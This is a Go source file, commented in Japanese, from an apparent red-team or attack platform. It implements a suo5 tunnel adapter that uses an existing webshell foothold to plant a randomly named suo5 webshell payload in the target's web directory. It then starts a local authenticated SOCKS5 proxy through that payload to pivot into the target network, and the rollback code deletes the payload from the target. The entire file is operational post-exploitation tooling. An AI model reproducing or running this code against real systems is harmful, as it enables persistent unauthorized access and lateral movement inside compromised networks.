// suo5.go は「ターゲットに外向き通信がない」状況向けのトンネルアダプタ（RED-SUN-3 の振り返りで最大の穴：外向き通信が全 filtered
// のとき chisel のリバーストンネルでは解決できない）。suo5 は HTTP トンネル：単一ファイルの webshell payload をターゲットの
// Web 公開パスに配信し、プラットフォーム側の suo5 CLI が【受信方向】の HTTP で payload とネゴシエーションして socks5 を張る。
// ターゲットの外向き通信にまったく依存せず、フットホールドの webshell が生きていて、プラットフォームがターゲットの Web 口へ直結できればよい。
//
// chisel アダプタと台帳/ポートプール/ヘルスチェック/再起動の骨格を共有し（adapter フィールドで区別）、差異は次の層：
//  1. ターゲット側プロセスなし：payload はターゲットの Web コンテナが実行し、プラットフォーム側には suo5 CLI の 1 プロセスだけ
//     （ServerPID に記録し、procs 台帳は同じ仕組み）、
//  2. socks5 入口は必ず --auth 認証付き（CLI はコマンドラインしか受け付けず env オプションがない。プラットフォームの信頼ドメイン内では
//     ps から見える。入口は 127.0.0.1 にバインドし、このトレードオフをここに記す）、
//  3. 再起動 = 再配信：ターゲットの payload が削除された後、deploySuo5Into が再び書き込むため、「payload が消えたら再配信」を
//     自然にカバーする。
package tunnel

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	urlpkg "net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

// AdapterSuo5 は台帳の adapter フィールドにおける suo5 の値。
const AdapterSuo5 = "suo5"

// suo5UpWait は suo5 CLI がハンドシェイクを終えて socks の待受を開始するまで待つ上限
// （実測ではローカルループバックのハンドシェイク 3 秒 + ネゴシエーション + 自己テスト接続で約 10 秒。実ターゲット向けに余裕を取る）。
const suo5UpWait = 30 * time.Second

// Suo5PlanOpts は suo5 計画の生成入力。ポート割り当てとバインド検査は呼び出し側が注入し、
// 組み立てロジックは純粋関数のままテスト可能に保つ。
type Suo5PlanOpts struct {
	TaskID       int64
	ViaSessionID int64
	ShellURL     string // フットホールド webshell の URL（payload は同じディレクトリに書き、URL はファイル名を差し替える）
	SessionKind  string // sess.Kind()(http_php/http_phpcmd/http_jsp/http_aspx/http_*enc)
	VerifyAddr   string // 決定的検証の対象（webshell の host:port。ホスト自身は必ず到達可能）
	PortMin      int
	PortMax      int
	UsedPorts    map[int]bool
	CanListen    func(port int) bool
	DataDir      string // プラットフォーム側のトンネル作業ディレクトリ（ログ）
}

// Suo5PayloadFile はセッション種別に応じて payload のファイル名を選ぶ：jsp→suo5.jsp、php（phpcmd
// のコマンドシェル、phpenc の暗号化シェルを含む。暗号化シェルはトランスポート層の暗号化で、ターゲットでは平文の PHP が動く）→suo5.php、
// aspx→suo5.aspx。純粋関数。
func Suo5PayloadFile(kind string) (string, error) {
	s := strings.ToLower(strings.TrimSpace(kind))
	s = strings.TrimPrefix(s, "http_")
	s = strings.TrimSuffix(s, "enc")
	s = strings.TrimSuffix(s, "cmd")
	switch s {
	case "php":
		return "suo5.php", nil
	case "jsp":
		return "suo5.jsp", nil
	case "aspx":
		return "suo5.aspx", nil
	}
	return "", fmt.Errorf("セッション種別 %q に対応する suo5 payload がありません（php/jsp/aspx をサポート）", kind)
}

// Suo5PayloadURL は webshell の URL からファイル名を差し替えて payload URL を作る（同じディレクトリ）。クエリ文字列は消す
// （シェルの URL にパラメータが付くことがあるが、ファイルを変えた後は意味がない）。純粋関数。
func Suo5PayloadURL(shellURL, name string) (string, error) {
	u, err := urlpkg.Parse(shellURL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return "", fmt.Errorf("不正な webshell URL %q", shellURL)
	}
	dir := path.Dir(u.Path)
	if dir == "." || dir == "" {
		dir = "/"
	}
	u.Path = path.Join(dir, name)
	u.RawQuery = ""
	u.Fragment = ""
	return u.String(), nil
}

// Suo5Args は suo5 CLI の引数を組み立てる（v2.2.0：-t ターゲット URL、-l socks 待受、--auth は必須）。
// --auth はコマンドラインしか受け付けない（env オプションなし）。プラットフォームの信頼ドメイン内では ps から見えるが、入口を 127.0.0.1 にバインドするので許容する。純粋関数。
func Suo5Args(payloadURL string, port int, user, pass string) []string {
	return []string{
		"-t", payloadURL,
		"-l", "127.0.0.1:" + strconv.Itoa(port),
		"--auth", user + ":" + pass,
	}
}

// joinRemotePath はターゲット側のディレクトリ形態に合わせてパスを組み立てる（aspx シェルは Windows なので区切り文字はバックスラッシュ）。純粋関数。
func joinRemotePath(dir, name string) string {
	dir = strings.TrimRight(dir, "/\\")
	if strings.Contains(dir, "\\") {
		return dir + `\` + name
	}
	return dir + "/" + name
}

// parsePwd は pwd の応答からターゲット側の作業ディレクトリを取る（最初の非空行）。同時に、sh にインライン展開する際の
// 危険文字（引用符/バッククォート/$/セミコロン）を拒否する。純粋関数。
func parsePwd(out string) (string, error) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.ContainsAny(line, "'\"`$;") {
			return "", fmt.Errorf("ターゲット側の作業ディレクトリに危険な文字が含まれるため、インライン展開を拒否します： %q", line)
		}
		if !strings.HasPrefix(line, "/") && !strings.Contains(line, `:\`) {
			return "", fmt.Errorf("ターゲット側の作業ディレクトリの形態を判別できません： %q", line)
		}
		return line, nil
	}
	return "", fmt.Errorf("pwd の応答が空です（チャネル異常？）")
}

// remoteRemoveCmd はターゲット側の payload 削除コマンドを生成する（aspx は Windows なので del）。純粋関数。
func remoteRemoveCmd(payloadFile, payloadPath string) string {
	if strings.HasSuffix(payloadFile, ".aspx") {
		return fmt.Sprintf(`del /f "%s"`, payloadPath)
	}
	return fmt.Sprintf("rm -f '%s'", payloadPath)
}

// PlanSuo5 は suo5 計画を生成する：kind は常に socks で、プラットフォームのループバック ListenPort=SocksPort が
// socks5 入口（auth 付き）。ターゲット側プロセスなし、stage 配信なし、コールバックなし。PlatformAddr は空のまま。
func PlanSuo5(o *Suo5PlanOpts) (*Plan, error) {
	if o.ShellURL == "" {
		return nil, fmt.Errorf("shell_url は必須です（suo5 payload は webshell と同じディレクトリに書き込む必要があります）")
	}
	file, err := Suo5PayloadFile(o.SessionKind)
	if err != nil {
		return nil, err
	}
	tag, err := randTag()
	if err != nil {
		return nil, err
	}
	user, pass, err := newAuth()
	if err != nil {
		return nil, err
	}
	name := tag + filepath.Ext(file) // 8 桁のランダム hex ファイル名。特徴的な接頭辞を付けない
	payloadURL, err := Suo5PayloadURL(o.ShellURL, name)
	if err != nil {
		return nil, err
	}
	port, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	if o.UsedPorts == nil {
		o.UsedPorts = map[int]bool{}
	}
	o.UsedPorts[port] = true
	p := &Plan{
		Kind:         KindSocks,
		Adapter:      AdapterSuo5,
		TaskID:       o.TaskID,
		ViaSessionID: o.ViaSessionID,
		ListenHost:   "127.0.0.1", // suo5 入口はループバックにのみバインド
		ListenPort:   port,
		SocksPort:    port,
		AuthUser:     user,
		AuthPass:     pass,
		ServerLog:    o.DataDir + "/suo5-" + tag + ".log",
		VerifyAddr:   o.VerifyAddr,
		PayloadFile:  file,
		PayloadName:  name,
		PayloadURL:   payloadURL,
	}
	p.ServerArgs = Suo5Args(payloadURL, port, user, pass)
	return p, nil
}

// deploySuo5 は suo5 アダプタのデプロイ入口（Deploy が adapter でここへ分岐する）：台帳行の作成 →
// payload の配信 → URL のプローブ → CLI の起動 → 決定的検証 → alive の付与。いずれかが失敗したら段階的にロールバックする（行の削除を含む）。
func (m *Manager) deploySuo5(ctx context.Context, p *Plan) (*db.TunnelRecord, error) {
	if m.suo5Path == "" {
		return nil, fmt.Errorf("suo5 バイナリが見つかりません：suo5 を data/tools/suo5 に置くか、ARTEX_SUO5_PATH を設定して再試行してください")
	}
	if m.suo5PayloadsDir == "" {
		return nil, fmt.Errorf("suo5 payloads ディレクトリが見つかりません：data/tools/suo5-payloads に置くか、ARTEX_SUO5_PAYLOADS_DIR を設定して再試行してください")
	}
	if p.SocksPort <= 0 {
		return nil, fmt.Errorf("計画に socks 入口ポートがありません（socks_port）")
	}
	sess, ok := m.sessions.Get(p.ViaSessionID)
	if !ok {
		return nil, fmt.Errorf("セッション %d がレジストリにないため、デプロイできません", p.ViaSessionID)
	}
	rec := &db.TunnelRecord{
		TaskID: p.TaskID, Kind: p.Kind, Adapter: p.Adapter,
		ListenHost: p.ListenHost, ListenPort: p.ListenPort,
		ViaSessionID: p.ViaSessionID, State: db.TunnelDeploying,
	}
	raw, _ := json.Marshal(p)
	rec.DeployParams = raw
	id, err := m.store.Create(ctx, rec)
	if err != nil {
		return nil, fmt.Errorf("台帳の永続化に失敗しました： %w", err)
	}
	if err := m.deploySuo5Into(ctx, id, sess, p); err != nil {
		m.rollbackSuo5(ctx, id, sess, p)
		return nil, err
	}
	if err := m.store.UpdateState(ctx, id, db.TunnelAlive, ""); err != nil {
		log.Printf("[tunnel] 状態の書き戻しに失敗しました（id=%d）：%v", id, err)
	}
	m.notifyState(p.TaskID)
	rec, _ = m.store.Get(ctx, id)
	return rec, nil
}

// deploySuo5Into は層ごとに進め、各層の成功時点で台帳を永続化する（切断時の再起動に備える）。
func (m *Manager) deploySuo5Into(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	// 層 1：ターゲット側で webshell のあるディレクトリを特定し（セッションの cwd がシェルのディレクトリ）、ランダム名で
	// payload を書き込む（session.WriteFile が内部でバイナリ安全に分割する）。
	data, err := os.ReadFile(filepath.Join(m.suo5PayloadsDir, p.PayloadFile))
	if err != nil {
		return fmt.Errorf("層 payload_write: ローカル payload の読み込みに失敗しました： %w", err)
	}
	stdout, _, err := sess.Exec(ctx, "pwd", probeTimeout)
	if err != nil {
		return fmt.Errorf("層 payload_write: ターゲット側のディレクトリ特定に失敗しました： %w", err)
	}
	dir, err := parsePwd(stdout)
	if err != nil {
		return fmt.Errorf("層 payload_write: %w", err)
	}
	p.PayloadPath = joinRemotePath(dir, p.PayloadName)
	if err := sess.WriteFile(ctx, p.PayloadPath, data); err != nil {
		return fmt.Errorf("層 payload_write: セッションの書き込み %s に失敗しました： %w", p.PayloadPath, err)
	}
	m.saveParams(ctx, id, p)

	// 層 2：プラットフォームから HTTP で payload URL を直接プローブする（到達可能かつ 404 以外、トンネルパラメータなしの GET では
	// payload がエラーページを返すことがあるが、404 でなければファイルが Web ルート下で有効だと分かる）。
	if err := probePayloadURL(ctx, p.PayloadURL); err != nil {
		return fmt.Errorf("層 payload_url: %w", err)
	}

	// 層 3：プラットフォーム側で suo5 CLI を起動する（--auth は必須。パスワードは deploy_params として永続化される）。
	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("層 cli_process: ログのオープンに失敗しました： %w", err)
	}
	cmd := exec.Command(m.suo5Path, p.ServerArgs...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("層 cli_process: 起動に失敗しました： %w", err)
	}
	p.ServerPID = cmd.Process.Pid
	m.procs[id] = cmd
	m.saveParams(ctx, id, p)
	if m.OnListenStart != nil {
		m.OnListenStart(p.ListenPort)
	}
	go func() { _ = cmd.Wait(); _ = logFile.Close() }()

	// CLI が payload とのハンドシェイクを終えて socks の待受を開始するまで待つ（suo5 は起動時にまず接続テストを行い、失敗すると即終了する）。
	entry := m.entryAddr(p)
	deadline := time.Now().Add(suo5UpWait)
	up := false
	for time.Now().Before(deadline) {
		if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
			return fmt.Errorf("層 cli_process: suo5 が即終了しました（ハンドシェイク失敗？ログ %s）", p.ServerLog)
		}
		conn, err := net.DialTimeout("tcp", entry, dialProbeEvery)
		if err == nil {
			_ = conn.Close()
			up = true
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(dialProbeEvery):
		}
	}
	if !up {
		return fmt.Errorf("層 cli_process: %v 以内に socks 入口 %s が起動しませんでした（ログ %s）", suo5UpWait, entry, p.ServerLog)
	}

	// 層 4：決定的検証。socks（auth 付き）経由で webshell のホスト自身（必ず到達可能）へ CONNECT し、
	// 成功して初めて「payload が有効 + トンネルが双方向に通信を運べる」ことを証明する。入口が起きた ≠ トンネルが通る。
	if p.VerifyAddr == "" {
		return fmt.Errorf("層 verify: verify_addr（webshell の host:port）がなく、決定的検証ができません")
	}
	if err := socks5DialAuth(entry, p.VerifyAddr, p.AuthUser, p.AuthPass, verifyTimeout); err != nil {
		return fmt.Errorf("層 verify: socks 経由の CONNECT %s に失敗しました： %w", p.VerifyAddr, err)
	}
	return nil
}

// rollbackSuo5 はデプロイ失敗時の段階的ロールバック：CLI の停止（ポート台帳のフックを解放）→ ターゲット payload の削除 →
// 台帳行の削除。best-effort で、各層の失敗はログに記録して続行する。
func (m *Manager) rollbackSuo5(ctx context.Context, id int64, sess session.Session, p *Plan) {
	log.Printf("[tunnel] suo5 のデプロイ失敗のため段階的にロールバックします（id=%d）", id)
	m.killServer(id, p)
	m.removePayload(ctx, sess, p)
	if err := m.store.Delete(ctx, id); err != nil {
		log.Printf("[tunnel] 台帳行の削除に失敗しました（id=%d）：%v", id, err)
	}
}

// removePayload はセッション経由でターゲット側の payload を削除する（best-effort）。
func (m *Manager) removePayload(ctx context.Context, sess session.Session, p *Plan) {
	if p.PayloadPath == "" {
		return
	}
	if _, _, err := sess.Exec(ctx, remoteRemoveCmd(p.PayloadFile, p.PayloadPath), probeTimeout); err != nil {
		log.Printf("[tunnel] ターゲットの payload %s の削除に失敗しました： %v", p.PayloadPath, err)
	}
}

// directHTTP はプラットフォーム直結の HTTP クライアント（環境プロキシを通さない。ターゲットはイントラネットの直結アドレス）。
var directHTTP = &http.Client{
	Timeout:   10 * time.Second,
	Transport: &http.Transport{Proxy: nil},
}

// probePayloadURL はプラットフォームから payload URL を直接 GET する：到達可能かつ 404 以外なら合格。
func probePayloadURL(ctx context.Context, rawURL string) error {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return fmt.Errorf("payload URL が不正です： %w", err)
	}
	resp, err := directHTTP.Do(req)
	if err != nil {
		return fmt.Errorf("payload URL %s に到達できません（プラットフォームからターゲットの Web 口が通らない？）：%w", rawURL, err)
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	if resp.StatusCode == http.StatusNotFound {
		return fmt.Errorf("payload URL %s が 404 を返しました（書き込み先と URL のルートが異なる？）", rawURL)
	}
	return nil
}
